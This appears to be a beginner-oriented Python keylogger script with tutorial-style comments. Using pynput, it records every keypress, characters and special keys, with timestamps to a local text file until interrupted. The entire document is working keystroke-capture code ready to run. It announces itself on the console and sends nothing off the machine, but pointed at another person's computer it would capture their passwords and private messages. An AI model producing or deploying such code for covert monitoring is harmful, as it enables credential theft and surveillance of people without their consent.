# Import required libraries
from pynput import keyboard      # For detecting keyboard presses
import threading                 # For running tasks in parallel
import signal                   # For handling program shutdown signals
import sys                      # For system-related functions
from datetime import datetime   # For adding timestamps
import os                      # For file and path operations

class KeyLogger:
    """
    A class that handles keyboard logging operations.
    Think of this as a container for all our keylogger functions!
    """
    
    def __init__(self, filename="keyfile.txt"):
        """
        This is like setting up a new notebook to write in.
        It runs when we first create our keylogger.
        """
        # Name of the file where we'll save the keys
        self.filename = filename
        
        # This is like an ON/OFF switch - True means we're running
        self.running = True
        
        # This is our "stop button" - we use it to safely stop the program
        self.stop_event = threading.Event()
        
    def timestamp(self):
        """
        Creates a timestamp like '2025-03-16 13:42:47'
        This is like writing the date and time in our notebook
        """
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def key_pressed(self, key):
        """
        This function runs every time a key is pressed.
        It's like having someone watch the keyboard and write down every key you press.
        """
        try:
            # Open our file (like opening a notebook)
            # 'with' makes sure we close the file properly when we're done
            with open(self.filename, 'a') as log_file:
                # Get the current time
                timestamp = self.timestamp()
                
                # Check what kind of key was pressed
                if hasattr(key, 'char'):
                    # Normal keys (letters, numbers, etc.)
                    # Write it in our file with the time
                    log_file.write(f'[{timestamp}] Char: {key.char}\n')
                else:
                    # Special keys (Shift, Ctrl, etc.)
                    log_file.write(f'[{timestamp}] Special Key: {str(key)}\n')
                    
        except Exception as e:
            # If something goes wrong, tell us what happened
            print(f"Oops! Something went wrong while logging: {str(e)}")
            
        # Keep running unless someone told us to stop
        return not self.stop_event.is_set()

    def signal_handler(self, signum, frame):
        """
        This is like having an emergency stop button.
        When someone presses Ctrl+C, this function catches it and stops safely.
        """
        print("\nSomeone pressed Ctrl+C! Stopping the program...")
        self.stop()

    def stop(self):
        """
        This is our shutdown procedure.
        Like properly closing our notebook and putting away our pens.
        """
        # Tell the program it's time to stop
        self.stop_event.set()
        self.running = False
        
    def start(self):
        """
        This is where everything begins!
        Like opening our notebook and getting ready to write.
        """
        # Set up our emergency stop button (Ctrl+C handler)
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Start listening to the keyboard
        # The 'with' statement makes sure we clean up properly when done
        with keyboard.Listener(on_press=self.key_pressed) as listener:
            # Let the user know we're ready
            print(f"Keylogger is now running! Writing to {self.filename}")
            print("If you want to stop, just press Ctrl+C...")
            
            # This is our main loop - it keeps the program running
            while self.running and not self.stop_event.is_set():
                # Check every second if someone wants us to stop
                # This is like taking a quick break to see if we should continue
                self.stop_event.wait(timeout=1.0)
                
            # When we're done, stop listening to the keyboard
            listener.stop()
            
        print("\nKeylogger has stopped. Have a nice day!")

# This is where our program actually starts
if __name__ == "__main__":
    # Create our keylogger (like getting a fresh notebook ready)
    logger = KeyLogger()
    
    # Start logging! (like opening the notebook and beginning to write)
    logger.start()
